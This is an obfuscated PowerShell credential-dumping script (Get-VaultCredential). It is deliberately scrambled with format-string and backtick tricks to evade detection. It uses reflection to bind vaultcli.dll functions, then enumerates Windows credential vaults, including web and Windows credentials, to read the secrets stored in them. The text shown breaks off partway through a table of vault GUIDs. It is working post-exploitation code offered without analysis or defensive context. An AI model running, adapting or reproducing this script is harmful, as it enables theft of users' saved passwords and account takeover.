 ${fj`4H}= [TyPe]("{3}{2}{1}{0}" -F't','n','mE','eNVirOn')  ; &("{1}{0}"-f'eT','S')  ("{1}{0}"-f'A','Ld')  ( [tYPE]("{1}{0}" -F 'OmaIn','apPD')  )  ;   &("{0}{2}{1}"-f 'S','m','ET-ite') ("vari"+"Ab"+"le:a"+"p9") (  [typE]("{7}{6}{10}{2}{0}{5}{9}{4}{8}{3}{1}"-f't','SS','i','eracce','UIl','.ASSE','fleCT','RE','d','mbLyb','iOn.Em'))  ; ${32`5W} = [TYPE]("{8}{7}{4}{6}{0}{2}{3}{1}{9}{5}"-f 'EROpSe','tATTrIbU','RviCes.STrucTL','aYOU','IME.IN','E','t','nt','rU','t')  ;    ${Je`8VD} = [Type]("{1}{2}{5}{0}{4}{3}" -f'IN','ru','nTiMe','YoutKInd','TEROPsErvicEs.La','.') ; &('SV') ('s6'+'yc2')  ( [Type]("{2}{6}{4}{0}{1}{5}{3}"-F'TiOn.e','mIt.PackI','Sy','Ze','TEM.rEFLeC','nGSI','S')  );  &("{1}{2}{0}"-f 'm','Se','T-ITe') ("V"+"aRia"+"blE:IP"+"5Yvl")  ( [tyPE]("{0}{1}" -f'In','t32')  ) ;  &("{0}{1}{2}" -f'sEt-i','t','eM') ('VaRiablE:'+'X'+'o'+'s3')  ([tyPE]("{2}{0}{4}{1}{6}{5}{3}"-F 'ECtIOn.caLl','nG','REfl','oNs','i','NvEntI','co'))  ; ${4`I`TlF}  = [tYPE]("{1}{0}"-F 'D','guI')  ;   &("{0}{1}"-f 'Se','t')  ("{0}{1}"-f'8S','1E0g')  (  [TYPe]("{1}{10}{3}{6}{8}{2}{9}{0}{7}{4}{5}"-F 'e','runt','C','.intEropsER','IO','n','v','Nt','ICES.','alLingcOnV','iME') );  &('SV') ("{0}{1}" -f '0R9','5zL') ( [TyPE]("{7}{8}{1}{4}{6}{9}{5}{3}{0}{2}"-f'r','iME.INTE','set','a','rOP','viCeS.ch','SE','rU','nt','r')  ); &("{1}{2}{0}"-f '-iTem','se','t')  ("{1}{0}{2}" -f 'iA','VAR','BlE:796') ([tYpE]("{4}{7}{2}{6}{3}{8}{5}{0}{1}"-f'IcES.MARSH','aL','I','.inTer','R','Serv','Me','unt','Op'))  ;    ${R7`Ni9}=  [TYpE]("{0}{1}"-F 'In','TptR') ;&("{0}{1}" -f 's','ET')  ('H'+'95')  ( [TYPe]("{1}{0}{2}"-f'tETi','dA','Me') )  ; function g`E`T-V`A`ULtCR`EdEnTIaL
{

    [CmdletBinding()] Param()

    ${oS`VER`S`ion} =  ${f`j4h}::"osv`e`Rsi`on"."vERs`I`ON"
    ${o`SmaJ`or} = ${os`VeRS`ion}."m`AJOr"
    ${Os`m`INor} = ${OSVE`R`SION}."mIN`or"

    
    ${DyNaS`s`EmBLY} = &("{0}{1}{2}" -f'New-','Objec','t') ("{6}{2}{5}{1}{9}{3}{8}{7}{4}{0}"-f 'me','o','.Re','ssem','yNa','flecti','System','l','b','n.A')(("{1}{0}" -f 'ultUtil','Va'))
    ${ASSemB`Ly`Bu`ILDER} =  (&("{1}{0}"-f 'IlDITEm','ch')  ("{2}{1}{0}{3}"-f 'lE:','arIab','v','LDa') )."VA`luE"::"CuRrEnT`d`oMa`iN".("{4}{1}{6}{2}{0}{3}{5}" -f 'icAsse','fineDyn','m','mb','De','ly','a').Invoke(${d`YnAS`SEm`Bly},  ${a`p9}::"r`UN")
    ${mO`DulEB`U`i`lDer} = ${a`s`se`MBly`BuILdeR}.("{5}{2}{4}{1}{3}{6}{0}"-f 'le','cM','e','od','Dynami','Defin','u').Invoke(("{0}{1}{2}" -f'Vau','ltUti','l'), ${fa`LSE})

    ${EnuM`B`UI`lDER} = ${mODULeB`Ui`LD`eR}.("{2}{0}{1}" -f 'f','ineEnum','De').Invoke(("{3}{6}{2}{4}{7}{1}{5}{0}"-f'PE','MENT_T','Lib.','V','VAULT_E','Y','ault','LE'), ("{1}{0}"-f'c','Publi'), [Int32])
    ${NU`LL} = ${en`Umb`UIldeR}.("{2}{1}{0}{3}{4}" -f 'Li','fine','De','t','eral').Invoke(("{1}{0}{2}" -f 'efin','Und','ed'), -1)
    ${nU`LL} = ${eNumb`UI`L`DEr}.("{1}{0}{3}{2}"-f'fi','De','eral','neLit').Invoke(("{0}{1}" -f 'Bo','olean'), 0)
    ${Nu`lL} = ${e`Nu`MBuILDeR}.("{2}{1}{0}"-f 'teral','ineLi','Def').Invoke(("{0}{1}" -f'Sh','ort'), 1)
    ${NU`LL} = ${eNu`MBUil`D`Er}.("{3}{2}{1}{0}" -f'al','Liter','ine','Def').Invoke(("{1}{2}{0}"-f'ort','Un','signedSh'), 2)
    ${N`ULL} = ${ENumB`U`ILdeR}.("{0}{1}{2}{3}"-f'D','ef','ineLit','eral').Invoke('Int', 3)
    ${nU`LL} = ${E`N`UMbUI`LdeR}.("{0}{1}{2}{3}"-f 'DefineLi','t','e','ral').Invoke(("{1}{2}{0}" -f'nt','U','nsignedI'), 4)
    ${n`ULl} = ${ENUM`BuIL`D`er}.("{0}{3}{1}{2}"-f'D','ineLit','eral','ef').Invoke(("{1}{0}"-f 'ble','Dou'), 5)
    ${n`Ull} = ${eNUM`B`UIldEr}.("{2}{0}{3}{1}" -f'efine','l','D','Litera').Invoke(("{1}{0}" -f 'uid','G'), 6)
    ${n`ULL} = ${e`Num`BuildEr}.("{1}{3}{0}{2}{4}" -f'ne','D','Lite','efi','ral').Invoke(("{1}{0}{2}"-f 'tri','S','ng'), 7)
    ${nU`ll} = ${ENumBu`I`lder}.("{0}{2}{1}"-f'D','teral','efineLi').Invoke(("{1}{2}{0}" -f 'eArray','B','yt'), 8)
    ${N`Ull} = ${E`N`UmbU`Ilder}.("{0}{2}{3}{1}"-f'Def','teral','in','eLi').Invoke(("{1}{2}{0}" -f 'mp','T','imeSta'), 9)
    ${Nu`lL} = ${enUMBu`il`DEr}.("{2}{0}{1}"-f 'it','eral','DefineL').Invoke(("{2}{4}{3}{0}{1}" -f 'a','y','Pr','tectedArr','o'), 10)
    ${N`ULL} = ${EnU`mb`UIL`Der}.("{1}{0}{2}" -f 'fi','De','neLiteral').Invoke(("{0}{1}"-f 'Attribut','e'), 11)
    ${n`UlL} = ${enUM`BUil`DEr}.("{3}{0}{2}{1}" -f'n','iteral','eL','Defi').Invoke('Sid', 12)
    ${n`UlL} = ${e`N`UM`BuIlder}.("{0}{1}{2}"-f'D','efineL','iteral').Invoke(("{0}{1}" -f'La','st'), 13)
    ${VAUL`T_ELEMEnT_t`Y`PE} = ${EN`UM`BUI`lder}.("{0}{2}{1}" -f 'Creat','Type','e').Invoke()

    ${enu`MBu`i`lDer} = ${mODu`l`e`BUi`ldEr}.("{0}{1}{3}{2}" -f 'D','ef','Enum','ine').Invoke(("{8}{2}{0}{6}{4}{1}{5}{7}{9}{3}" -f'b','S','tLi','T_ID','_','CHEM','.VAULT','A_ELE','Vaul','MEN'), ("{0}{1}"-f 'Publ','ic'), [Int32])
    ${NU`Ll} = ${eNUmB`U`iLD`er}.("{1}{3}{2}{0}"-f'teral','Def','eLi','in').Invoke(("{0}{1}"-f'I','llegal'), 0)
    ${Nu`ll} = ${en`UmbuiL`deR}.("{1}{0}{2}" -f 'efineLit','D','eral').Invoke(("{1}{0}{2}"-f'c','Resour','e'), 1)
    ${n`UlL} = ${enUMBUI`l`dER}.("{0}{3}{1}{2}"-f'De','neLitera','l','fi').Invoke(("{0}{1}{2}"-f'Ident','it','y'), 2)
    ${n`ULl} = ${E`NuM`BUIL`dEr}.("{0}{1}{2}{3}"-f'DefineLit','er','a','l').Invoke(("{0}{1}{2}" -f 'Authent','icato','r'), 3)
    ${Nu`lL} = ${enUMBU`ilD`ER}.("{0}{1}{2}" -f 'D','efineLite','ral').Invoke('Tag', 4)
    ${n`Ull} = ${e`Nu`Mbu`Ilder}.("{3}{2}{1}{0}" -f'ral','neLite','i','Def').Invoke(("{2}{1}{0}" -f 'd','geSi','Packa'), 5)
    ${Nu`LL} = ${EN`Um`Bu`IldEr}.("{1}{3}{2}{0}"-f'al','Defi','Liter','ne').Invoke(("{0}{1}"-f'AppS','tart'), 100)
    ${nU`Ll} = ${en`UMBUi`l`dER}.("{1}{0}{2}"-f 'efine','D','Literal').Invoke(("{1}{2}{0}" -f'nd','Ap','pE'), 10000)
    ${V`AUl`T_`ScHem`A_`ELemenT`_id} = ${eNuMBUI`L`d`ER}.("{2}{3}{0}{1}" -f'Typ','e','Cr','eate').Invoke()

    ${layo`UTco`N`stRucTOR} =   (&("{3}{2}{0}{1}" -f 'v','ariaBlE','Et-','G') ('3'+'25W') )."VAl`Ue"."GETC`o`NS`TrUCT`OR"([Runtime.InteropServices.LayoutKind])
    ${cHAR`seT`FiE`lD} =   ${32`5W}.("{0}{1}{2}"-f'Ge','tFi','eld').Invoke(("{1}{0}" -f 't','CharSe'))
    ${sTRU`C`TLAyo`U`TCUstoMa`TtRiBUtE} = &("{1}{2}{0}"-f'ject','New-O','b') ("{3}{1}{8}{6}{2}{5}{0}{10}{9}{4}{7}" -f 'rib','on.','t','Reflecti','Buil','omAtt','us','der','Emit.C','e','ut')(${L`A`yOUTc`Ons`TruCTOr},
                                                                                     @( (  &("{0}{2}{3}{1}"-f 'geT-VA','Le','RiA','B') ("{1}{0}" -f'E8VD','j'))."va`lUe"::"exPLi`CIT"),
                                                                                     ${Ch`A`RSeT`F`IeLD},
                                                                                     @(  (  &("{1}{0}{2}"-f'ariaB','V','Le')  ('0R'+'9'+'5Zl') -vAlue )::"An`sI"))
    ${sTRu`CTATt`RIbU`TES} = ("{13}{10}{5}{15}{3}{14}{17}{16}{9}{0}{11}{12}{7}{6}{2}{4}{1}{8}"-f', Publi','reFiel',', ',' AnsiC','Befo','u','d','entialLayout, Seale','dInit','ss','Layo','c, Seq','u','Auto','la','t,','la','ss, C')

    ${t`YpEBuI`L`der} = ${m`o`duL`ebuIlDEr}.("{1}{3}{0}{2}" -f'neTy','D','pe','efi').Invoke(("{5}{2}{3}{0}{4}{1}" -f 'A','EM','tL','ib.V','ULT_IT','Vaul'), ${strUcT`AtT`Rib`U`Tes}, [Object],  ${s`6`yC2}::"s`iZE4")
    ${N`ULL} = ${T`YPeb`U`ilDer}.("{2}{0}{1}" -f'e','fineField','D').Invoke(("{0}{1}"-f 'Sch','emaId'), [Guid], ("{0}{1}{2}" -f 'P','ubl','ic'))
    ${NU`LL} = ${TYP`EB`UIlD`eR}.("{0}{1}{2}"-f'Def','in','eField').Invoke(("{3}{4}{2}{1}{0}{5}" -f'riendl','dentialF','e','ps','zCr','yName'), [IntPtr], ("{0}{1}"-f'Pub','lic'))
    ${n`Ull} = ${t`Yp`e`BUiLDER}.("{2}{0}{3}{1}" -f'e','eField','D','fin').Invoke(("{4}{0}{1}{3}{2}"-f 'our','c','Element','e','pRes'), [IntPtr], ("{0}{1}"-f'P','ublic'))
    ${N`ULl} = ${tYpEbuI`L`der}.("{1}{0}{2}" -f'ine','Def','Field').Invoke(("{3}{2}{1}{0}"-f'ement','El','tity','pIden'), [IntPtr], ("{1}{0}"-f 'ic','Publ'))
    ${n`ULl} = ${Ty`PEB`UI`lDeR}.("{0}{2}{1}"-f'DefineF','d','iel').Invoke(("{1}{2}{3}{0}"-f'enticatorElement','p','Aut','h'), [IntPtr], ("{1}{0}"-f'lic','Pub'))
    if (${os`majOR} -ge 6 -and ${osm`inOR} -ge 2)
    {
        ${nU`Ll} = ${t`y`pebUI`lDeR}.("{0}{3}{1}{2}"-f 'D','ineFiel','d','ef').Invoke(("{2}{1}{0}{3}" -f 'eSi','g','pPacka','d'), [IntPtr], ("{1}{0}" -f 'ublic','P'))
    }
    ${NU`Ll} = ${typE`B`UIL`der}.("{1}{0}{2}{3}" -f'F','Define','i','eld').Invoke(("{3}{0}{1}{2}" -f 'if','i','ed','LastMod'), [UInt64], ("{1}{0}"-f'ublic','P'))
    ${NU`LL} = ${ty`p`Ebui`lDer}.("{0}{1}{2}" -f'De','fineFie','ld').Invoke(("{2}{1}{0}"-f 'ags','wFl','d'), [UInt32], ("{1}{0}"-f'lic','Pub'))
    ${n`ULL} = ${ty`p`ebuiLD`er}.("{2}{1}{0}"-f'ield','efineF','D').Invoke(("{3}{0}{4}{2}{1}" -f'Propert','ount','esC','dw','i'), [UInt32], ("{1}{0}{2}"-f 'bli','Pu','c'))
    ${NU`LL} = ${t`Ype`BUiLd`er}.("{2}{0}{1}"-f'e','fineField','D').Invoke(("{1}{3}{2}{0}" -f 'ments','pPr','Ele','operty'), [IntPtr], ("{0}{1}"-f'Pu','blic'))
    ${Vaul`T_`itEM} = ${TyPE`B`U`ildeR}.("{2}{0}{1}" -f'teTy','pe','Crea').Invoke()

    ${TYp`ebUILd`Er} = ${mOd`UlEbUi`L`dEr}.("{1}{0}{2}"-f 'fineTy','De','pe').Invoke(("{6}{3}{2}{4}{1}{5}{7}{0}{8}" -f '_','T','b.VA','Li','UL','_','Vault','ITEM','ELEMENT'), ${St`RUCt`ATTR`IbutEs})
    ${TY`PEBUI`ld`ER}.("{2}{3}{1}{0}{4}"-f 'Attribu','om','SetC','ust','te').Invoke(${S`TrucTl`A`Yo`UTCuSToMA`TtRIBUtE})
    ${nU`Ll} = ${TYp`Eb`U`iLDER}.("{0}{1}{2}"-f'De','fineFie','ld').Invoke(("{4}{0}{1}{2}{3}"-f 'hema','El','ement','Id','Sc'), ${VAult_sc`h`EmA_El`EmENt_`Id}, ("{0}{1}" -f 'Publi','c')).("{1}{0}{2}" -f 'Of','Set','fset').Invoke(0)
    ${nu`ll} = ${tYPe`Bu`IlD`ER}.("{2}{0}{3}{1}"-f 'n','Field','Defi','e').Invoke(("{0}{1}" -f 'Ty','pe'), ${VaUL`T_e`l`EMenT`_TyPe}, ("{1}{0}"-f'lic','Pub')).("{0}{1}"-f'SetOff','set').Invoke(8)
    ${VaUl`T_ITE`m_eLe`ME`NT} = ${tYp`eBu`IlDer}.("{1}{0}{2}" -f'eTy','Creat','pe').Invoke()


    ${Typebu`IL`DEr} = ${mOdu`L`ebUiLd`ER}.("{0}{1}{2}"-f'DefineTy','p','e').Invoke(("{0}{4}{2}{1}{3}" -f 'Vault','Vault','ib.','cli','L'), ("{1}{3}{2}{0}" -f', Class','P','blic','u'))
    ${pInv`O`k`EmeThoD} = ${tYP`EBu`iLD`Er}.("{1}{3}{0}{4}{2}" -f'PInvoke','De','thod','fine','Me').Invoke(("{0}{1}{2}{3}" -f'V','a','ultOpenV','ault'),
                                                      ("{0}{1}{2}"-f'vaultc','l','i.dll'),
                                                      ("{1}{0}{3}{2}" -f'c, Sta','Publi','ic','t'),
                                                       ${x`os3}::"st`ANdA`RD",
                                                      [Int32],
                                                      [Type[]] @(  (  &("{1}{3}{0}{2}"-f'DItE','chi','M','L')  ('v'+'Ari'+'ablE:4I'+'Tl'+'F'))."V`AlUE".("{1}{3}{2}{0}" -f 'Type','Ma','ByRef','ke').Invoke(),
                                                                 [UInt32],
                                                                   (  &("{1}{0}" -f'ir','D')  ('V'+'ARiaBLe:'+'R7nI'+'9') )."va`lUe".("{3}{2}{1}{0}" -f 'pe','efTy','keByR','Ma').Invoke()),
                                                        (  &("{0}{1}" -f 'I','Tem')  ('VA'+'r'+'iABLE'+':8S1E0G'))."V`ALuE"::"Wi`Na`pI",
                                                       (  &("{1}{2}{0}"-f'iAblE','v','ar')  ("{0}{1}" -f'0r95Z','L')  )."VAl`Ue"::"AU`TO")

    ${Pin`V`OkEMe`Thod} = ${typE`B`U`iLDeR}.("{3}{1}{0}{2}"-f 'et','PInvokeM','hod','Define').Invoke(("{2}{0}{4}{3}{1}" -f'tCl','lt','Vaul','eVau','os'),
                                                      ("{1}{2}{0}{3}" -f'tcl','va','ul','i.dll'),
                                                      ("{3}{1}{2}{0}{4}" -f ', Stati','u','blic','P','c'),
                                                       (&("{2}{0}{1}" -f'T-','varIABle','gE')  ("{1}{0}" -f'3','xOs') -VAlU )::"STA`NDARd",
                                                      [Int32],
                                                      [Type[]] @(  (  &("{1}{0}"-f 'itEM','cHIld') ('vA'+'RIaB'+'L'+'e:R'+'7nI9'))."VA`LuE".("{1}{0}{3}{2}"-f 'yRef','MakeB','e','Typ').Invoke()),
                                                        (  &("{1}{3}{0}{2}" -f'aRiAbl','GEt-','e','v')  ("{2}{1}{0}"-f 'G','0','8S1e'))."va`lUe"::"wi`NApi",
                                                        ( &("{2}{0}{1}" -f 'Ab','LE','VARI') ('0R9'+'5zl') )."Va`LUE"::"Au`TO")

    ${p`i`N`VOkEm`etHOd} = ${tyPE`BU`ILDER}.("{1}{0}{3}{2}" -f 'In','DefineP','thod','vokeMe').Invoke(("{2}{0}{1}" -f 'aultF','ree','V'),
                                                      ("{0}{1}{2}"-f'vaultc','li.dl','l'),
                                                      ("{3}{1}{0}{4}{2}" -f't','c, S','tic','Publi','a'),
                                                       ${x`Os3}::"StA`N`DARD",
                                                      [Int32],
                                                      [Type[]] @([IntPtr]),
                                                        (  &("{1}{0}" -f 'ir','d')  ('V'+'aRia'+'Ble:8'+'s1e0g') )."VA`Lue"::"Wi`NA`pi",
                                                        ( &("{1}{0}"-f 'E','vaRIaBl') ("0R95"+"z"+"L")  -ValU )::"a`UtO")

    ${P`I`NvOkEMe`Th`OD} = ${ty`PEb`UIlDEr}.("{3}{2}{4}{1}{0}{5}"-f 'h','eMet','v','DefinePIn','ok','od').Invoke(("{1}{0}{3}{2}"-f 'erateV','VaultEnum','s','ault'),
                                                      ("{1}{2}{0}"-f 'i.dll','vaultc','l'),
                                                      ("{3}{1}{2}{0}{4}"-f' S','li','c,','Pub','tatic'),
                                                       (&("{0}{1}{2}"-f'chiLDiT','e','M') ("{0}{4}{2}{1}{3}" -f'vAr','O','e:X','S3','Iabl')  )."va`LuE"::"stA`N`DaRd",
                                                      [Int32],
                                                      [Type[]] @([Int32],
                                                                  (  &("{2}{1}{0}"-f'aBLe','ri','get-Va')  ("IP5"+"Yvl")  -VALUeO ).("{3}{2}{0}{1}" -f'keByRefT','ype','a','M').Invoke(),
                                                                   ${R`7ni9}.("{2}{0}{1}" -f 'yRe','fType','MakeB').Invoke()),
                                                       ( &("{0}{2}{3}{1}" -f'G','vAriaBLe','eT','-') ("8s1E"+"0G") -valueO  )::"w`I`NApi",
                                                       (  &("{0}{1}" -f 'G','Ci') ("{3}{1}{2}{0}"-f '5Zl','iab','lE:0r9','Var') )."V`ALUE"::"aU`To")

    ${Pi`NVOKEMe`Th`Od} = ${Typ`ebu`Ild`er}.("{3}{2}{1}{4}{0}" -f 'd','PInvokeMet','e','Defin','ho').Invoke(("{4}{1}{3}{0}{5}{2}"-f'umera','t','tems','En','Vaul','teI'),
                                                      ("{0}{2}{1}"-f 'vaultcl','dll','i.'),
                                                      ("{1}{2}{0}" -f'Static','Publ','ic, '),
                                                       ( &('gI')  ("VARiabL"+"e"+":xO"+"S3"))."v`AlUe"::"s`TA`NdArd",
                                                      [Int32],
                                                      [Type[]] @([IntPtr],
                                                                 [Int32],
                                                                   (&("{0}{1}{2}" -f 'VA','ria','Ble')  ('IP5Y'+'vL')  )."vAL`UE".("{2}{1}{0}"-f 'e','yRefTyp','MakeB').Invoke(),
                                                                   ${R`7nI9}.("{0}{2}{1}" -f'MakeByR','pe','efTy').Invoke()),
                                                       ${8s`1`E0g}::"wiN`ApI",
                                                        ${0R95`zL}::"A`UTo")

    if (${Os`M`Ajor} -ge 6 -and ${Os`min`Or} -ge 2)
    {
        ${piNVOK`E`M`eThOD} = ${Ty`p`EbU`ILdEr}.("{0}{4}{3}{1}{5}{2}" -f 'Defi','keMe','od','nvo','nePI','th').Invoke(("{0}{2}{1}"-f'V','GetItem','ault'),
                                                          ("{0}{2}{1}{3}" -f 'vau','l','ltcli.d','l'),
                                                          ("{4}{3}{0}{1}{2}"-f' S','tat','ic','ublic,','P'),
                                                            (  &('LS') ("VaRi"+"abLE:xos"+"3")  )."vAL`UE"::"STAn`D`ArD",
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                       ${4`I`TlF}.("{1}{2}{0}{3}{4}" -f'ByRe','M','ake','fTyp','e').Invoke(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                      ${R7N`i9}.("{1}{2}{0}{3}"-f 'Ref','Make','By','Type').Invoke()),
                                                           (&("{0}{1}{2}"-f 'G','ET','-itEm')  ('Vari'+'aBlE:8'+'s1'+'E0'+'G')  )."vaL`UE"::"W`i`NaPi",
                                                           ${0`R9`5zL}::"aU`To")
    }
    else
    {
        ${PInvo`kEM`et`h`od} = ${typEB`U`IlDER}.("{2}{0}{1}{3}" -f'nvokeM','etho','DefinePI','d').Invoke(("{0}{1}{2}{3}"-f'Vault','Get','It','em'),
                                                          ("{0}{1}{2}" -f 'vault','c','li.dll'),
                                                          ("{3}{2}{1}{0}" -f'atic','St','c, ','Publi'),
                                                            (&("{1}{0}" -f't-IteM','ge')  ('vARiAblE:'+'X'+'o'+'S3') )."v`AlUE"::"s`TaNda`Rd",
                                                          [Int32],
                                                          [Type[]] @([IntPtr],
                                                                      ${4it`Lf}.("{2}{4}{0}{1}{3}"-f 'f','Typ','Make','e','ByRe').Invoke(),
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [IntPtr],
                                                                     [Int32],
                                                                      (&('ls') ("{3}{0}{1}{2}"-f 'Riab','Le:r7','ni9','vA') )."Val`UE".("{0}{4}{2}{1}{3}" -f 'M','y','eByRefT','pe','ak').Invoke()),
                                                           (&("{1}{0}" -f'r','DI') ("{1}{4}{2}{3}{0}" -f'E0G','V','aBlE:','8s1','ARi'))."v`AluE"::"WIn`Api",
                                                            ${0r9`5`ZL}::"A`Uto")
    }

    ${V`Au`ltClI} = ${ty`peB`Uil`DER}.("{2}{0}{1}" -f 'eT','ype','Creat').Invoke()
    

    
    function LOcal:GE`T-`VAUl`TeL`eM`ENTValUE
    {
        Param (
            [ValidateScript({${_} -ne   ( &("{1}{0}{2}"-f 'T-C','GE','hilDItEM')  ("v"+"a"+"RIAbLe"+":r7NI9"))."VAL`UE"::"Ze`Ro"})]
            [IntPtr]
            ${V`A`UlTELeme`NTp`Tr}
        )

        ${PA`R`TialELE`menT} =   ( &("{1}{2}{0}"-f'e','VAr','IaBl') ("79"+"6")  -valueonly)::"P`T`Rt`oSTructure"(${VaULTE`l`EM`E`NTPtR}, [Type] ${v`AuLT_i`Tem_`EL`E`ment})
        ${E`lemeNT`PTr} = [IntPtr] (${V`A`U`LTele`mentPTR}.("{0}{1}{2}"-f 'T','oInt6','4').Invoke() + 16)

        switch (${pArti`ALEleMe`Nt}."tY`PE")
        {
            ((("{1}{0}{2}{4}{3}{5}" -f 'l5{V','C','Ault_eLemEnt_','}::S','tyPE','tring')) -crepLACe ([ChaR]67+[ChaR]108+[ChaR]53),[ChaR]36) {
                ${s`T`RI`Ngptr} =   (&("{0}{1}"-f'dI','R') ("{1}{0}{2}" -f':','VAriabLE','796'))."Val`Ue"::"r`e`ADINtpTR"([IntPtr] ${e`LEME`N`TPTr})
                 (&("{1}{0}" -f 'ARIAbLE','V') ("79"+"6")  -valUeOn  )::"PT`RT`OstR`I`NgUni"([IntPtr] ${st`RiNgP`TR})
            }

            (("{4}{2}{1}{5}{0}{3}"-f'::Boo','elEMenT_T','T_','lean','o5e{vAUl','YpE}')).replAce('o5e',[stRiNg][CHar]36) {
                [Bool]  ${7`96}::"rE`Adb`yTE"([IntPtr] ${E`L`emeNtP`TR})
            }

            ((("{2}{4}{6}{5}{3}{0}{1}" -f'::Shor','t','MPL{V','tYPe}','AUL','T_','t_elEMen'))-REpLAcE([cHar]77+[cHar]80+[cHar]76),[cHar]36) {
                  ${7`96}::"readiN`T`16"([IntPtr] ${e`LE`M`EntPtr})
            }

            (("{5}{0}{3}{8}{1}{4}{2}{6}{7}"-f'u','::Un','ign','lt_eLeMENT_','s','TDw{Va','ed','Short','TyPe}')).repLaCE('TDw','$') {
                 ${7`96}::"rEAd`iNt`16"([IntPtr] ${e`LEme`N`TptR})
            }

            (("{4}{0}{2}{3}{5}{6}{7}{1}" -f'm4{','nt','V','AUlt_eLEm','3','E','NT_tYpE}','::I')).REPLAcE(([CHaR]51+[CHaR]109+[CHaR]52),'$') {
                 ( &("{0}{2}{1}{3}{4}" -f'G','HI','et-c','LDItE','m') ("{0}{1}{2}"-f 'Var','iaBLE:','796'))."Va`LuE"::"R`EADI`Nt32"([IntPtr] ${elEmeN`Tp`Tr})
            }

            (("{4}{6}{1}{2}{5}{3}{0}"-f'ignedInt','Leme','nt_TYp','}::Uns','Cpu{','E','vAulT_e')).ReplACE('Cpu','$') {
                 ( &("{1}{2}{3}{0}"-f 'BlE','get-','V','aRia')  796 -ValU  )::"rEadI`Nt`32"([IntPtr] ${E`LeM`EnTP`Tr})
            }

            (("{4}{7}{1}{6}{3}{8}{5}{2}{0}"-f'e','lT_Ele','l','D','Rh6','b','mEnT_tyPE}::','{vAu','ou')).rEpLacE(([char]82+[char]104+[char]54),[STRiNg][char]36) {
                  ${7`96}::"p`T`RT`oStrUcT`UrE"(${EL`EM`e`NtPtr}, [Type] [Double])
            }

            (("{5}{4}{0}{1}{3}{6}{2}" -f'0{VA','ULt_ELemENt_tYP','d','e','1','R','}::Gui')).ReplAcE(([ChAr]82+[ChAr]49+[ChAr]48),'$') {
                 (  &("{0}{2}{1}"-f'gEt','bLe','-VArIA') ("79"+"6")  -value  )::"pTrtO`s`TRuct`URe"(${ELE`ment`p`Tr}, [Type] [Guid])
            }

            ((("{2}{7}{3}{1}{0}{4}{6}{8}{5}"-f 'eM','T_eL','YM','l','EN','id','t_TypE}:','r{VAu',':S'))  -cREPlAce  ([CHaR]89+[CHaR]77+[CHaR]114),[CHaR]36) {
                ${Sid`Ptr} =  ${7`96}::"rEA`DiNt`Ptr"([IntPtr] ${EL`EME`NtP`Tr})
                &("{1}{2}{0}{3}"-f'e-V','W','rit','erbose') "0x$($SidPtr.ToString('X8'))"
                ${s`idO`BJ`ECt} = [Security.Principal.SecurityIdentifier] ([IntPtr] ${S`i`dptR})
                ${S`IDObje`cT}."VaL`Ue"
            }

            
            
            (("{5}{2}{6}{1}{3}{8}{0}{4}{7}"-f':B','T_','LT_ELeM','TyP','y','3AG{VAu','EN','teArray','e}:')).RePlACe(([cHar]51+[cHar]65+[cHar]71),[strING][cHar]36) { ${n`ULL} }
            ((("{3}{2}{0}{4}{5}{7}{6}{1}" -f'N','amp','lt_eLemE','dNw{VAu','t_tyPe}:',':Time','t','S')) -REplAce([cHaR]100+[cHaR]78+[cHaR]119),[cHaR]36) { ${N`Ull} }
            (("{5}{2}{4}{3}{1}{6}{7}{0}" -f'ray','ot','N','}::Pr','T_TYpE','7vR{VAulT_eLEmE','ect','edAr')).RePlaCe('7vR',[STRInG][cHaR]36) { ${n`ULl} }
            (("{7}{5}{2}{8}{0}{3}{4}{1}{6}" -f'T_ELEMe','}::Attribu','AU','NT_','tYpe','A{v','te','l5','l')).REPLaCE(([CHar]108+[CHar]53+[CHar]65),'$') { ${N`ULl} }
            (("{4}{2}{3}{6}{0}{1}{5}"-f':',':L','8{vaULT_E','Lement_','Sk','ast','TypE}')).rEpLaCE(([Char]83+[Char]107+[Char]56),'$') { ${N`ULl} }
        }
    }

    ${vaULt`co`Unt} = 0
    ${v`AuL`TGuI`DPtR} =   (&("{1}{0}{2}" -f 'Abl','vaRI','E')  ("r7N"+"i9")  )."VAL`Ue"::"ZE`RO"
    ${R`ESulT} = ${v`A`UlTC`lI}::"vAulTeNuM`eR`AteVAuL`Ts"(0, [Ref] ${v`AuL`TCoUNt}, [Ref] ${Vau`Ltgu`i`dptr})

    if (${R`Es`Ult} -ne 0)
    {
        throw "Unable to enumerate vaults. Error (0x$($Result.ToString('X8'))) "
    }

    ${GUI`D`A`dDress} = ${v`A`ULTg`UiDp`TR}

    ${vAu`L`TSCHe`Ma} = @{
        ([Guid] ("{3}{5}{9}{1}{0}{6}{4}{2}{8}{7}{10}"-f'0641','-','-3612D8','2F1A6','4CF-8BB5','5','-4','2E','65F','04','5')) = ("{3}{0}{5}{2}{4}{1}"-f'ws','e','ecu','Windo','re Not',' S')
        ([Guid] ("{3}{8}{2}{5}{1}{0}{4}{7}{6}" -f'A2','-','99-87A8-4','3CCD','15-','B10','D3B55','608888D','54')) = ("{8}{1}{7}{4}{5}{6}{3}{0}{2}{9}"-f'n','dows Web ','ti','ede','sword',' C','r','Pas','Win','al')
        ([Guid] ("{10}{6}{0}{1}{2}{7}{4}{5}{3}{8}{9}" -f '4E23D0-','C644','-','72','F-8','CE6-50692','5','4E6','F999','F','1')) = ("{10}{2}{1}{8}{6}{0}{7}{5}{3}{4}{9}"-f 'Cre','ndo','i','Pick','er Protecto',' ','s ','dential','w','r','W')
        ([Guid] ("{1}{3}{2}{0}{4}{6}{5}"-f'38','4BF4C442-9B8A','0-B','-41A','0-DD4','04DDB28','A7')) = ("{1}{3}{4}{0}{2}" -f'l','Web C','s','redent','ia')
        ([Guid] ("{4}{2}{6}{5}{7}{1}{3}{0}"-f '6F3B29','E80-','7BC5','61736B','7','F0A','82B-','6-4E15-4')) = ("{1}{0}{2}{3}"-f'ind','W','ows Cr','edentials')
        ([Guid] ("{1}{7}{9}{3}{4}{10}{6}{8}{2}{5}{0}"-f'BC','E','0D4D4C','38-91B5','-4F','C2','D','69','5-23','D78','C9-89')) = ("{0}{1}{4}{6}{5}{3}{2}" -f'Wi','ndows D','ntial','te Crede','omain Certi','ca','fi')
